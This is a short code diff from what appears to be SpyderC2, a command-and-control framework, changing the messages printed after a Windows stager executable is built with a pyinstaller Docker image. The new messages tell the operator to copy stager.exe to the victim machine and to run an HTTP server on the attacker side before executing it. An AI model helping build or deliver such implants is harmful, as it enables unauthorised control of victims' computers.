@@ -71,9 +71,9 @@ def generate_stager():
 
 		if not docker():
 			subprocess.check_output('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows ', cwd=rf"{os.path.join(PATH,'tmp')}",shell=True)
-			print(colored("exe dumped to ./tmp",'green'))
+			print(colored("exe dumped to ./tmp/dist/windows.Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
 		else:
-			print(colored('Please run : '+colored('sudo docker run -v "<path_to_SpyderC2>/data/tmp:/src/" cdrx/pyinstaller-windows','cyan')+' on the host machine. The stager will be generated in <path_to_SpyderC2>/data/tmp'))
+			print(colored('Please run the following command: '+colored('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows','cyan')+' in <path_to_SpyderC2>/data/tmp directory on the host machine. The stager will be generated in <path_to_SpyderC2>/data/tmp/dist/windows. Copy it to your victim machine, once generated.Do run a HTTP server on attacker by running http command before executing stager.exe.'))
 	except subprocess.CalledProcessError as grepexc:                                                                                                   
 		print(colored(f"exe generation failed ","red"))
 
